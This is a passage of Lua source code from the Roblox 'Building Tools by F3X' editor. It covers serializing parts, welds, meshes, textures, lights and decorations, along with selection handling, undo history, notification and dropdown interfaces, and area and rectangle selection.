	elseif Part.ClassName == "SpawnLocation" then
		return Types.Spawn;

	elseif Part.ClassName == "WedgePart" then
		return Types.Wedge;

	elseif Part.ClassName == "CornerWedgePart" then
		return Types.Corner;

	elseif Part.ClassName == "TrussPart" then
		return Types.Truss;

	end;

end;

function _serializeParts( parts )
	-- Returns JSON-encoded data about parts in
	-- table `parts` that can be used to recreate them

	local data = {
		version = 1,
		parts = {}
	};

	local objects = {};

	-- Store part data
	for _, Part in pairs( parts ) do
		local part_id = _generateSerializationID();
		local PartData = {
			_getSerializationPartType( Part ),
			_splitNumberListString( tostring( Part.Size ) ),
			_splitNumberListString( tostring( Part.CFrame ) ),
			Part.BrickColor.Number,
			Part.Material.Value,
			Part.Anchored,
			Part.CanCollide,
			Part.Reflectance,
			Part.Transparency,
			Part.TopSurface.Value,
			Part.BottomSurface.Value,
			Part.LeftSurface.Value,
			Part.RightSurface.Value,
			Part.FrontSurface.Value,
			Part.BackSurface.Value
		};
		data.parts[part_id] = PartData;
		objects[part_id] = Part;
	end;

	-- Get any welds in the selection
	local welds = {};
	for object_id, Object in pairs( objects ) do
		if Object:IsA( "BasePart" ) then
			for _, Joint in pairs( _getAllDescendants( Services.Workspace ) ) do
				if Joint:IsA( "Weld" ) and Joint.Name == "BTWeld" then
					if Joint.Part0 == Object and #_findTableOccurrences( objects, Joint.Part1 ) > 0 then
						table.insert( welds, Joint );
					end;
				end;
			end;
		end;
	end;

	-- Serialize any welds
	if #welds > 0 then
		data.welds = {};
		for _, Weld in pairs( welds ) do
			local weld_id = _generateSerializationID();
			local WeldData = {
				_findTableOccurrences( objects, Weld.Part0 )[1],
				_findTableOccurrences( objects, Weld.Part1 )[1],
				_splitNumberListString( tostring( Weld.C1 ) )
			};
			data.welds[weld_id] = WeldData;
			objects[weld_id] = Weld;
		end;
	end;

	-- Get any meshes in the selection
	local meshes = {};
	for _, Part in pairs( parts ) do
		local Mesh = _getChildOfClass( Part, "SpecialMesh" );
		if Mesh then
			table.insert( meshes, Mesh );
		end;
	end;

	-- Serialize any meshes
	if #meshes > 0 then
		data.meshes = {};
		for _, Mesh in pairs( meshes ) do
			local mesh_id = _generateSerializationID();
			local MeshData = {
				_findTableOccurrences( objects, Mesh.Parent )[1],
				Mesh.MeshType.Value,
				_splitNumberListString( tostring( Mesh.Scale ) ),
				Mesh.MeshId,
				Mesh.TextureId,
				_splitNumberListString( tostring( Mesh.VertexColor ) )
			};
			data.meshes[mesh_id] = MeshData;
			objects[mesh_id] = Mesh;
		end;
	end;

	-- Get any textures in the selection
	local textures = {};
	for _, Part in pairs( parts ) do
		local textures_found = _getChildrenOfClass( Part, "Texture" );
		for _, Texture in pairs( textures_found ) do
			table.insert( textures, Texture );
		end;
		local decals_found = _getChildrenOfClass( Part, "Decal" );
		for _, Decal in pairs( decals_found ) do
			table.insert( textures, Decal );
		end;
	end;

	-- Serialize any textures
	if #textures > 0 then
		data.textures = {};
		for _, Texture in pairs( textures ) do
			local texture_type;
			if Texture.ClassName == "Decal" then
				texture_type = 1;
			elseif Texture.ClassName == "Texture" then
				texture_type = 2;
			end;
			local texture_id = _generateSerializationID();
			local TextureData = {
				_findTableOccurrences( objects, Texture.Parent )[1],
				texture_type,
				Texture.Face.Value,
				Texture.Texture,
				Texture.Transparency,
				texture_type == 2 and Texture.StudsPerTileU or nil,
				texture_type == 2 and Texture.StudsPerTileV or nil
			};
			data.textures[texture_id] = TextureData;
			objects[texture_id] = Texture;
		end;
	end;

	-- Get any lights in the selection
	local lights = {};
	for _, Part in pairs( parts ) do
		local lights_found = _getChildrenOfClass( Part, "Light", true );
		for _, Light in pairs( lights_found ) do
			table.insert( lights, Light );
		end;
	end;

	-- Serialize any lights
	if #lights > 0 then
		data.lights = {};
		for _, Light in pairs( lights ) do
			local light_type;
			if Light:IsA( "PointLight" ) then
				light_type = 1;
			elseif Light:IsA( "SpotLight" ) then
				light_type = 2;
			end;
			local light_id = _generateSerializationID();
			local LightData = {
				_findTableOccurrences( objects, Light.Parent )[1];
				light_type,
				_splitNumberListString( tostring( Light.Color ) ),
				Light.Brightness,
				Light.Range,
				Light.Shadows,
				light_type == 2 and Light.Angle or nil,
				light_type == 2 and Light.Face.Value or nil
			};
			data.lights[light_id] = LightData;
			objects[light_id] = Light;
		end;
	end;

	-- Get any decorations in the selection
	local decorations = {};
	for _, Part in pairs( parts ) do
		table.insert( decorations, _getChildOfClass( Part, 'Smoke' ) )
		table.insert( decorations, _getChildOfClass( Part, 'Fire' ) );
		table.insert( decorations, _getChildOfClass( Part, 'Sparkles' ) );
	end;

	-- Serialize any decorations
	if #decorations > 0 then
		data.decorations = {};
		for _, Decoration in pairs( decorations ) do
			local decoration_type;
			if Decoration:IsA( 'Smoke' ) then
				decoration_type = 1;
			elseif Decoration:IsA( 'Fire' ) then
				decoration_type = 2;
			elseif Decoration:IsA( 'Sparkles' ) then
				decoration_type = 3;
			end;
			local decoration_id = _generateSerializationID();
			local DecorationData = {
				_findTableOccurrences( objects, Decoration.Parent )[1],
				decoration_type
			};
			if decoration_type == 1 then
				DecorationData[3] = _splitNumberListString( tostring( Decoration.Color ) );
				DecorationData[4] = Decoration.Opacity;
				DecorationData[5] = Decoration.RiseVelocity;
				DecorationData[6] = Decoration.Size;
			elseif decoration_type == 2 then
				DecorationData[3] = _splitNumberListString( tostring( Decoration.Color ) );
				DecorationData[4] = _splitNumberListString( tostring( Decoration.SecondaryColor ) );
				DecorationData[5] = Decoration.Heat;
				DecorationData[6] = Decoration.Size;
			elseif decoration_type == 3 then
				DecorationData[3] = _splitNumberListString( tostring( Decoration.SparkleColor ) );
			end;
			data.decorations[decoration_id] = DecorationData;
			objects[decoration_id] = Decoration;
		end;
	end;

	return RbxUtility.EncodeJSON( data );

end;

function _getChildOfClass( Parent, class_name, inherit )
	-- Returns the first child of `Parent` that is of class `class_name`
	-- or nil if it couldn't find any

	-- Look for a child of `Parent` of class `class_name` and return it
	if not inherit then
		for _, Child in pairs( Parent:GetChildren() ) do
			if Child.ClassName == class_name then
				return Child;
			end;
		end;
	else
		for _, Child in pairs( Parent:GetChildren() ) do
			if Child:IsA( class_name ) then
				return Child;
			end;
		end;
	end;

	return nil;

end;

function _getChildrenOfClass( Parent, class_name, inherit )
	-- Returns a table containing the children of `Parent` that are
	-- of class `class_name`
	local matches = {};


	if not inherit then
		for _, Child in pairs( Parent:GetChildren() ) do
			if Child.ClassName == class_name then
				table.insert( matches, Child );
			end;
		end;
	else
		for _, Child in pairs( Parent:GetChildren() ) do
			if Child:IsA( class_name ) then
				table.insert( matches, Child );
			end;
		end;
	end;

	return matches;
end;

function _HSVToRGB( hue, saturation, value )
	-- Returns the RGB equivalent of the given HSV-defined color
	-- (adapted from some code found around the web)

	-- If it's achromatic, just return the value
	if saturation == 0 then
		return value;
	end;

	-- Get the hue sector
	local hue_sector = math.floor( hue / 60 );
	local hue_sector_offset = ( hue / 60 ) - hue_sector;

	local p = value * ( 1 - saturation );
	local q = value * ( 1 - saturation * hue_sector_offset );
	local t = value * ( 1 - saturation * ( 1 - hue_sector_offset ) );

	if hue_sector == 0 then
		return value, t, p;
	elseif hue_sector == 1 then
		return q, value, p;
	elseif hue_sector == 2 then
		return p, value, t;
	elseif hue_sector == 3 then
		return p, q, value;
	elseif hue_sector == 4 then
		return t, p, value;
	elseif hue_sector == 5 then
		return value, p, q;
	end;
end;

function _RGBToHSV( red, green, blue )
	-- Returns the HSV equivalent of the given RGB-defined color
	-- (adapted from some code found around the web)

	local hue, saturation, value;

	local min_value = math.min( red, green, blue );
	local max_value = math.max( red, green, blue );

	value = max_value;

	local value_delta = max_value - min_value;

	-- If the color is not black
	if max_value ~= 0 then
		saturation = value_delta / max_value;

	-- If the color is purely black
	else
		saturation = 0;
		hue = -1;
		return hue, saturation, value;
	end;

	if red == max_value then
		hue = ( green - blue ) / value_delta;
	elseif green == max_value then
		hue = 2 + ( blue - red ) / value_delta;
	else
		hue = 4 + ( red - green ) / value_delta;
	end;

	hue = hue * 60;
	if hue < 0 then
		hue = hue + 360;
	end;

	return hue, saturation, value;
end;

function CreateSignal()
	-- Returns a ROBLOX-like signal for connections (RbxUtility's is buggy)

	local Signal = {
		Connections	= {};

		Connect = function ( Signal, Handler )
			table.insert( Signal.Connections, Handler );

			local ConnectionController = {
				Handler = Handler;
				Disconnect = function ( Connection )
					local ConnectionSearch = _findTableOccurrences( Signal.Connections, Connection.Handler );
					if #ConnectionSearch > 0 then
						local ConnectionIndex = ConnectionSearch[1];
						table.remove( Signal.Connections, ConnectionIndex );
					end;
				end;
			};

			-- Add compatibility aliases
			ConnectionController.disconnect = ConnectionController.Disconnect;

			return ConnectionController;
		end;

		Fire = function ( Signal, ... )
			for _, Connection in pairs( Signal.Connections ) do
				Connection( ... );
			end;
		end;
	};

	-- Add compatibility aliases
	Signal.connect	= Signal.Connect;
	Signal.fire		= Signal.Fire;

	return Signal;
end;

------------------------------------------
-- Prepare the UI
------------------------------------------
-- Wait for all parts of the base UI to fully replicate
if ToolType == 'tool' then
	local UIComponentCount = (Tool:WaitForChild 'UIComponentCount').Value;
	repeat wait( 0.1 ) until #_getAllDescendants( Tool.Interfaces ) >= UIComponentCount;
end;

------------------------------------------
-- Create data containers
------------------------------------------
ActiveKeys = {};

CurrentTool = nil;

function equipTool( NewTool )

	-- If it's a different tool than the current one
	if CurrentTool ~= NewTool then

		-- Run (if existent) the old tool's `Unequipped` listener
		if CurrentTool and CurrentTool.Listeners.Unequipped then
			CurrentTool.Listeners.Unequipped();
		end;

		CurrentTool = NewTool;

		-- Recolor the handle
		if ToolType == 'tool' then
			Tool.Handle.BrickColor = NewTool.Color;
		end;

		-- Highlight the right button on the dock
		for _, Button in pairs( Dock.ToolButtons:GetChildren() ) do
			Button.BackgroundTransparency = 1;
		end;
		local Button = Dock.ToolButtons:FindFirstChild( getToolName( NewTool ) .. "Button" );
		if Button then
			Button.BackgroundTransparency = 0;
		end;

		-- Run (if existent) the new tool's `Equipped` listener
		if NewTool.Listeners.Equipped then
			NewTool.Listeners.Equipped();
		end;

	end;
end;

function cloneSelection()
	-- Clones the items in the selection

	-- Make sure that there are items in the selection
	if #Selection.Items > 0 then

		local item_copies = {};

		-- Make a copy of every item in the selection and add it to table `item_copies`
		for _, Item in pairs( Selection.Items ) do
			local ItemCopy = Item:Clone();
			ItemCopy.Parent = Services.Workspace;
			table.insert( item_copies, ItemCopy );
		end;

		-- Replace the selection with the copied items
		Selection:clear();
		for _, Item in pairs( item_copies ) do
			Selection:add( Item );
		end;

		local HistoryRecord = {
			copies = item_copies;
			unapply = function ( self )
				for _, Copy in pairs( self.copies ) do
					if Copy then
						Copy.Parent = nil;
					end;
				end;
			end;
			apply = function ( self )
				Selection:clear();
				for _, Copy in pairs( self.copies ) do
					if Copy then
						Copy.Parent = Services.Workspace;
						Copy:MakeJoints();
						Selection:add( Copy );
					end;
				end;
			end;
		};
		History:add( HistoryRecord );

		-- Play a confirmation sound
		local Sound = RbxUtility.Create "Sound" {
			Name = "BTActionCompletionSound";
			Pitch = 1.5;
			SoundId = Assets.ActionCompletionSound;
			Volume = 1;
			Parent = Player or Services.SoundService;
		};
		Sound:Play();
		Sound:Destroy();

		-- Highlight the outlines of the new parts
		coroutine.wrap( function ()
			for transparency = 1, 0.5, -0.1 do
				for Item, SelectionBox in pairs( SelectionBoxes ) do
					SelectionBox.Transparency = transparency;
				end;
				wait( 0.1 );
			end;
		end )();

	end;

end;

function deleteSelection()
	-- Deletes the items in the selection

	if #Selection.Items == 0 then
		return;
	end;

	local selection_items = _cloneTable( Selection.Items );

	-- Create a history record
	local HistoryRecord = {
		targets = selection_items;
		parents = {};
		apply = function ( self )
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.Parent = nil;
				end;
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.Parent = self.parents[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
	};

	for _, Item in pairs( selection_items ) do
		HistoryRecord.parents[Item] = Item.Parent;
		Item.Parent = nil;
	end;

	History:add( HistoryRecord );

end;

function prismSelect()
	-- Selects all the parts within the area of the selected parts

	-- Make sure parts to define the area are present
	if #Selection.Items == 0 then
		return;
	end;

	local parts = {};

	-- Get all the parts in workspace
	local workspace_parts = {};
	local workspace_children = _getAllDescendants( Services.Workspace );
	for _, Child in pairs( workspace_children ) do
		if Child:IsA( 'BasePart' ) and not Selection:find( Child ) then
			table.insert( workspace_parts, Child );
		end;
	end;

	-- Go through each part and perform area tests on each one
	local checks = {};
	for _, Item in pairs( workspace_parts ) do
		checks[Item] = 0;
		for _, SelectionItem in pairs( Selection.Items ) do

			-- Calculate the position of the item in question in relation to the area-defining parts
			local offset = SelectionItem.CFrame:toObjectSpace( Item.CFrame );
			local extents = SelectionItem.Size / 2;

			-- Check the item off if it passed this test (if it's within the range of the extents)
			if ( math.abs( offset.x ) <= extents.x ) and ( math.abs( offset.y ) <= extents.y ) and ( math.abs( offset.z ) <= extents.z ) then
				checks[Item] = checks[Item] + 1;
			end;

		end;
	end;

	-- Delete the parts that were used to select the area
	local selection_items = _cloneTable( Selection.Items );
	local selection_item_parents = {};
	for _, Item in pairs( selection_items ) do
		selection_item_parents[Item] = Item.Parent;
		Item.Parent = nil;
	end;

	-- Select the parts that passed any area checks
	for _, Item in pairs( workspace_parts ) do
		if checks[Item] > 0 then
			Selection:add( Item );
		end;
	end;

	-- Add a history record
	History:add( {
		selection_parts = selection_items;
		selection_part_parents = selection_item_parents;
		new_selection = _cloneTable( Selection.Items );
		apply = function ( self )
			Selection:clear();
			for _, Item in pairs( self.selection_parts ) do
				Item.Parent = nil;
			end;
			for _, Item in pairs( self.new_selection ) do
				Selection:add( Item );
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Item in pairs( self.selection_parts ) do
				Item.Parent = self.selection_part_parents[Item];
				Selection:add( Item );
			end;
		end;
	} );

end;

function toggleHelp()

	-- Make sure the dock is ready
	if not Dock then
		return;
	end;

	-- Toggle the visibility of the help tooltip
	Dock.HelpInfo.Visible = not Dock.HelpInfo.Visible;

end;

function getToolName( tool )
	-- Returns the name of `tool` as registered in `Tools`

	local name_search = _findTableOccurrences( Tools, tool );
	if #name_search > 0 then
		return name_search[1];
	end;

end;

function isSelectable( Object )
	-- Returns whether `Object` is selectable

	if not Object or not Object.Parent or not Object:IsA( "BasePart" ) or Object.Locked or Selection:find( Object ) or Groups:IsPartIgnored( Object ) then
		return false;
	end;

	-- If it passes all checks, return true
	return true;
end;

-- Provide initial HttpService availability info
HttpAvailable, HttpAvailabilityError = Tool.HttpInterface.Test:InvokeServer();

-- Keep track of the latest HttpService availability status
-- (which is only likely to change while in Studio, using the plugin)
if ToolType == 'plugin' then
	Services.HttpService.Changed:connect( function ()
		HttpAvailable, HttpAvailabilityError = Tool.HttpInterface.Test:InvokeServer();
	end );
end;

local StartupNotificationsShown = false;
function ShowStartupNotifications()

	-- Make sure the startup notifications are only shown once
	if StartupNotificationsShown then
		return;
	end;
	StartupNotificationsShown = true;

	-- Create the main container for notifications
	local NotificationContainer = Tool.Interfaces.BTStartupNotificationContainer:Clone();

	local function SetContainerSize()
		-- A function to position the notifications in the container and
		-- resize the container to fit all the notifications

		-- Keep track of the lowest extent of each item in the container
		local LowestPoint = 0;

		local Notifications = NotificationContainer:GetChildren();
		for NotificationIndex, Notification in pairs( Notifications ) do

			-- Position each notification under the last one
			Notification.Position = UDim2.new(
				Notification.Position.X.Scale,
				Notification.Position.X.Offset,
				Notification.Position.Y.Scale,
				( LowestPoint == 0 ) and 0 or ( LowestPoint + 10 )
			);

			-- Calculate the lowest point of this notification
			local VerticalEnd = Notification.Position.Y.Offset + Notification.Size.Y.Offset;
			if Notification.Visible and VerticalEnd > LowestPoint then
				LowestPoint = VerticalEnd;
			end;

		end;

		NotificationContainer.Size = UDim2.new(
			NotificationContainer.Size.X.Scale,
			NotificationContainer.Size.X.Offset,
			0,
			LowestPoint
		);
	end;

	SetContainerSize();

	-- Have the container start from the center/bottom of the screen
	local HCenterPos = ( UI.AbsoluteSize.x - NotificationContainer.Size.X.Offset ) / 2;
	local VBottomPos = UI.AbsoluteSize.y + NotificationContainer.Size.Y.Offset;
	NotificationContainer.Position = UDim2.new( 0, HCenterPos, 0, VBottomPos );

	NotificationContainer.Parent = UI;

	local function CenterNotificationContainer()
		-- A function to center the notification container

		-- Animate the container to slide up to the absolute center of the screen
		local VCenterPos = ( UI.AbsoluteSize.y - NotificationContainer.Size.Y.Offset ) / 2;
		NotificationContainer:TweenPosition(
			UDim2.new( 0, HCenterPos, 0, VCenterPos ),
			Enum.EasingDirection.Out,
			Enum.EasingStyle.Quad,
			0.2
		);
	end;

	CenterNotificationContainer();

	-- Add functionality to the notification UIs
	for _, Notification in pairs( NotificationContainer:GetChildren() ) do
		if Notification.Visible then
			Notification.OKButton.MouseButton1Click:connect( function ()
				Notification:Destroy();
				SetContainerSize();
				CenterNotificationContainer();
			end );
			Notification.HelpButton.MouseButton1Click:connect( function ()
				Notification.HelpButton:Destroy();
				Notification.ButtonSeparator:Destroy();
				Notification.OKButton:TweenSize(
					UDim2.new( 1, 0, 0, 22 ),
					Enum.EasingDirection.Out,
					Enum.EasingStyle.Quad,
					0.2
				);
				Notification.Notice:Destroy();
				Notification.Help.Visible = true;
				Notification:TweenSize(
					UDim2.new(
						Notification.Size.X.Scale, Notification.Size.X.Offset,
						Notification.Size.Y.Scale, Notification.Help.NotificationSize.Value
					),
					Enum.EasingDirection.Out,
					Enum.EasingStyle.Quad,
					0.2,
					true,
					function ()
						SetContainerSize();
						CenterNotificationContainer();
					end
				);
			end );
		end;
	end;

	-- Get rid of the notifications if the user unequips the tool
	if ToolType == 'tool' then
		Tool.Unequipped:connect( function ()
			if NotificationContainer.Visible then
				NotificationContainer.Visible = false;
				NotificationContainer:Destroy();
			end;
		end );
	end;
end;

-- Keep some state data
clicking = false;
selecting = false;
click_x, click_y = 0, 0;
override_selection = false;

SelectionBoxes = {};
SelectionExistenceListeners = {};
SelectionBoxColor = BrickColor.new( "Cyan" );
TargetBox = nil;

-- Keep a container for temporary connections
-- from the platform
Connections = {};

-- Make sure the UI container gets placed
UI = RbxUtility.Create "ScreenGui" {
	Name = "Building Tools by F3X (UI)"
};
if ToolType == 'tool' then
	UI.Parent = GUIContainer;
elseif ToolType == 'plugin' then
	UI.Parent = Services.CoreGui;
end;

Dragger = nil;

function updateSelectionBoxColor()
	-- Updates the color of the selectionboxes
	for _, SelectionBox in pairs( SelectionBoxes ) do
		SelectionBox.Color = SelectionBoxColor;
	end;
end;

Selection = {

	["Items"] = {};

	-- Provide events to listen to changes in the selection
	["Changed"] = RbxUtility.CreateSignal();
	["ItemAdded"] = RbxUtility.CreateSignal();
	["ItemRemoved"] = RbxUtility.CreateSignal();

	-- Provide a method to get an item's index in the selection
	["find"] = function ( self, Needle )

		-- Look through all the selected items and return the matching item's index
		for item_index, Item in pairs( self.Items ) do
			if Item == Needle then
				return item_index;
			end;
		end;

		-- Otherwise, return `nil`

	end;

	-- Provide a method to add items to the selection
	["add"] = function ( self, NewPart )

		-- Make sure `NewPart` is selectable
		if not isSelectable( NewPart ) then
			return false;
		end;

		-- Make sure `NewPart` isn't already in the selection
		if #_findTableOccurrences( self.Items, NewPart ) > 0 then
			return false;
		end;

		-- Insert it into the selection
		table.insert( self.Items, NewPart );

		-- Add its SelectionBox
		SelectionBoxes[NewPart] = Instance.new( "SelectionBox", UI );
		SelectionBoxes[NewPart].Name = "BTSelectionBox";
		SelectionBoxes[NewPart].Color = SelectionBoxColor;
		SelectionBoxes[NewPart].Adornee = NewPart;
		SelectionBoxes[NewPart].Transparency = 0.5;

		-- Remove any target selection box focus
		if NewPart == TargetBox.Adornee then
			TargetBox.Adornee = nil;
		end;

		-- Make sure to remove the item from the selection when it's deleted
		SelectionExistenceListeners[NewPart] = NewPart.AncestryChanged:connect( function ( Object, NewParent )
			if NewParent == nil then
				Selection:remove( NewPart );
			end;
		end );

		-- Provide a reference to the last item added to the selection (i.e. NewPart)
		self:focus( NewPart );

		-- Fire events
		self.ItemAdded:fire( NewPart );
		self.Changed:fire();

	end;

	-- Provide a method to remove items from the selection
	["remove"] = function ( self, Item )

		-- Make sure selection item `Item` exists
		if not self:find( Item ) then
			return false;
		end;

		-- Remove `Item`'s SelectionBox
		local SelectionBox = SelectionBoxes[Item];
		if SelectionBox then
			SelectionBox:Destroy();
		end;
		SelectionBoxes[Item] = nil;

		-- Delete the item from the selection
		table.remove( self.Items, self:find( Item ) );

		-- If it was logged as the last item, change it
		if self.Last == Item then
			self:focus( ( #self.Items > 0 ) and self.Items[#self.Items] or nil );
		end;

		-- Delete the existence listeners of the item
		SelectionExistenceListeners[Item]:disconnect();
		SelectionExistenceListeners[Item] = nil;

		-- Fire events
		self.ItemRemoved:fire( Item );
		self.Changed:fire();

	end;

	-- Provide a method to clear the selection
	["clear"] = function ( self )

		-- Go through all the items in the selection and call `self.remove` on them
		for _, Item in pairs( _cloneTable( self.Items ) ) do
			self:remove( Item );
		end;

	end;

	-- Provide a method to change the focus of the selection
	["focus"] = function ( self, NewFocus )

		-- Change the focus
		self.Last = NewFocus;

		-- Fire events
		self.Changed:fire();

	end;

};

-- Keep the Studio selection up-to-date (if applicable)
if ToolType == 'plugin' then
	Selection.Changed:connect( function ()
		Services.Selection:Set( Selection.Items );
	end );
end;

Tools = {};

------------------------------------------
-- Define other utilities needed by tools
------------------------------------------

function createDropdown()

	local Frame = RbxUtility.Create "Frame" {
		Name = "Dropdown";
		Size = UDim2.new( 0, 20, 0, 20 );
		BackgroundTransparency = 1;
		BorderSizePixel = 0;
		ClipsDescendants = true;
	};

	RbxUtility.Create "ImageLabel" {
		Parent = Frame;
		Name = "Arrow";
		BackgroundTransparency = 1;
		BorderSizePixel = 0;
		Image = Assets.ExpandArrow;
		Position = UDim2.new( 1, -21, 0, 3 );
		Size = UDim2.new( 0, 20, 0, 20 );
		ZIndex = 3;
	};

	local DropdownObject = {
		-- Provide access to the actual frame
		Frame = Frame;

		-- Keep a list of all the options in the dropdown
		_options = {};

		-- Provide a function to add options to the dropdown
		addOption = function ( self, option )

			-- Add the option to the list
			table.insert( self._options, option );

			-- Create the GUI for the option
			local Button = RbxUtility.Create "TextButton" {
				Parent = self.Frame;
				BackgroundColor3 = Color3.new( 0, 0, 0 );
				BackgroundTransparency = 0.3;
				BorderColor3 = Color3.new( 27 / 255, 42 / 255, 53 / 255 );
				BorderSizePixel = 1;
				Name = option;
				Position = UDim2.new( math.ceil( #self._options / 9 ) - 1, 0, 0, 25 * ( ( #self._options % 9 == 0 ) and 9 or ( #self._options % 9 ) ) );
				Size = UDim2.new( 1, 0, 0, 25 );
				ZIndex = 3;
				Text = "";
			};
			local Label = RbxUtility.Create "TextLabel" {
				Parent = Button;
				BackgroundTransparency = 1;
				BorderSizePixel = 0;
				Position = UDim2.new( 0, 6, 0, 0 );
				Size = UDim2.new( 1, -30, 1, 0 );
				ZIndex = 3;
				Font = Enum.Font.ArialBold;
				FontSize = Enum.FontSize.Size12;
				Text = option;
				TextColor3 = Color3.new( 1, 1, 1 );
				TextXAlignment = Enum.TextXAlignment.Left;
				TextYAlignment = Enum.TextYAlignment.Center;
			};

			-- Return the button object
			return Button;

		end;

		selectOption = function ( self, option )
			self.Frame.MainButton.CurrentOption.Text = option;
		end;

		open = false;

		toggle = function ( self )

			-- If it's open, close it
			if self.open then
				self.Frame.MainButton.BackgroundTransparency = 0.3;
				self.Frame.ClipsDescendants = true;
				self.open = false;

			-- If it's not open, open it
			else
				self.Frame.MainButton.BackgroundTransparency = 0;
				self.Frame.ClipsDescendants = false;
				self.open = true;
			end;

		end;

	};

	-- Create the GUI for the option
	local MainButton = RbxUtility.Create "TextButton" {
		Parent = Frame;
		Name = "MainButton";
		BackgroundColor3 = Color3.new( 0, 0, 0 );
		BackgroundTransparency = 0.3;
		BorderColor3 = Color3.new( 27 / 255, 42 / 255, 53 / 255 );
		BorderSizePixel = 1;
		Position = UDim2.new( 0, 0, 0, 0 );
		Size = UDim2.new( 1, 0, 0, 25 );
		ZIndex = 2;
		Text = "";

		-- Toggle the dropdown when pressed
		[RbxUtility.Create.E "MouseButton1Up"] = function ()
			DropdownObject:toggle();
		end;
	};
	RbxUtility.Create "TextLabel" {
		Parent = MainButton;
		Name = "CurrentOption";
		BackgroundTransparency = 1;
		BorderSizePixel = 0;
		Position = UDim2.new( 0, 6, 0, 0 );
		Size = UDim2.new( 1, -30, 1, 0 );
		ZIndex = 3;
		Font = Enum.Font.ArialBold;
		FontSize = Enum.FontSize.Size12;
		Text = "";
		TextColor3 = Color3.new( 1, 1, 1 );
		TextXAlignment = Enum.TextXAlignment.Left;
		TextYAlignment = Enum.TextYAlignment.Center;
	};

	return DropdownObject;

end;

------------------------------------------
-- Provide an interface to the 2D
-- selection system
------------------------------------------

Select2D = {

	-- Keep state data
	["enabled"] = false;

	-- Keep objects
	["GUI"] = nil;

	-- Keep temporary, disposable connections
	["Connections"] = {};

	-- Provide an interface to the functions
	["start"] = function ( self )

		if self.enabled then
			return;
		end;

		self.enabled = true;

		-- Create the GUI
		self.GUI = RbxUtility.Create "ScreenGui" {
			Name = "BTSelectionRectangle";
			Parent = UI;
		};

		local Rectangle = RbxUtility.Create "Frame" {
			Name = "Rectangle";
			Active = false;
			Parent = self.GUI;
			BackgroundColor3 = Color3.new( 0, 0, 0 );
			BackgroundTransparency = 0.5;
			BorderSizePixel = 0;
			Position = UDim2.new( 0, math.min( click_x, Mouse.X ), 0, math.min( click_y, Mouse.Y ) );
			Size = UDim2.new( 0, math.max( click_x, Mouse.X ) - math.min( click_x, Mouse.X ), 0, math.max( click_y, Mouse.Y ) - math.min( click_y, Mouse.Y ) );
		};

		-- Listen for when to resize the selection
		self.Connections.SelectionResize = Mouse.Move:connect( function ()
			Rectangle.Position = UDim2.new( 0, math.min( click_x, Mouse.X ), 0, math.min( click_y, Mouse.Y ) );
			Rectangle.Size = UDim2.new( 0, math.max( click_x, Mouse.X ) - math.min( click_x, Mouse.X ), 0, math.max( click_y, Mouse.Y ) - math.min( click_y, Mouse.Y ) );
		end );

		-- Listen for when the selection ends (when the left mouse button is released)
		self.Connections.SelectionEnd = Services.UserInputService.InputEnded:connect( function ( InputData )
			if InputData.UserInputType == Enum.UserInputType.MouseButton1 then
				self:select();
				self:finish();
			end;
		end );

	end;

	["select"] = function ( self )

		if not self.enabled then
			return;
		end;

		for _, Object in pairs( _getAllDescendants( Services.Workspace ) ) do

			-- Make sure we can select this part
			if isSelectable( Object ) then

				-- Check if the part is rendered within the range of the selection area
				local PartPosition = _pointToScreenSpace( Object.Position );
				if PartPosition then
					local left_check = PartPosition.x >= self.GUI.Rectangle.AbsolutePosition.x;
					local right_check = PartPosition.x <= ( self.GUI.Rectangle.AbsolutePosition.x + self.GUI.Rectangle.AbsoluteSize.x );
					local top_check = PartPosition.y >= self.GUI.Rectangle.AbsolutePosition.y;
					local bottom_check = PartPosition.y <= ( self.GUI.Rectangle.AbsolutePosition.y + self.GUI.Rectangle.AbsoluteSize.y );

					-- If the part is within the selection area, select it
					if left_check and right_check and top_check and bottom_check then
						Selection:add( Object );
					end;
				end;

			end;

		end;

	end;

	["finish"] = function ( self )

		if not self.enabled then
			return;
		end;

		-- Disconnect temporary connections
		for connection_index, Connection in pairs( self.Connections ) do
			Connection:disconnect();
			self.Connections[connection_index] = nil;
		end;

		-- Remove temporary objects
		self.GUI:Destroy();
		self.GUI = nil;

		self.enabled = false;

	end;

};

------------------------------------------
-- Provide an interface to the edge
-- selection system
------------------------------------------
SelectEdge = {

	-- Keep state data
	["enabled"] = false;
	["started"] = false;

	-- Keep objects
	["Marker"] = nil;
	["MarkerOutline"] = RbxUtility.Create "SelectionBox" {
		Color = BrickColor.new( "Institutional white" );
		Parent = UI;
		Name = "BTEdgeSelectionMarkerOutline";
	};

	-- Keep temporary, disposable connections
	["Connections"] = {};

	-- Provide an interface to the functions
	["start"] = function ( self, edgeSelectionCallback )

		if self.started then
			return;
		end;

		-- Listen for when to engage in selection
		self.Connections.KeyListener = Mouse.KeyDown:connect( function ( key )

			local key = key:lower();
			local key_code = key:byte();

			if key == "t" and #Selection.Items > 0 then
				self:enable( edgeSelectionCallback );
			end;

		end );

		self.started = true;

	end;

	["enable"] = function ( self, edgeSelectionCallback )

		if self.enabled then
			return;
		end;

		self.Connections.MoveListener = Mouse.Move:connect( function ()

			-- Make sure the target can be selected
			if not Selection:find( Mouse.Target ) then
				return;
			end;

			-- Calculate the proximity to each edge
			local Proximity = {};
			local edges = {};

			-- Create shortcuts to certain things that are expensive to call constantly
			local table_insert = table.insert;
			local newCFrame = CFrame.new;
			local PartCFrame = Mouse.Target.CFrame;
			local partCFrameOffset = PartCFrame.toWorldSpace;
			local PartSize = Mouse.Target.Size / 2;
			local size_x, size_y, size_z = PartSize.x, PartSize.y, PartSize.z;

			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( size_x, size_y, size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( -size_x, size_y, size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( size_x, -size_y, size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( size_x, size_y, -size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( -size_x, size_y, -size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( -size_x, -size_y, size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( size_x, -size_y, -size_z ) ) );
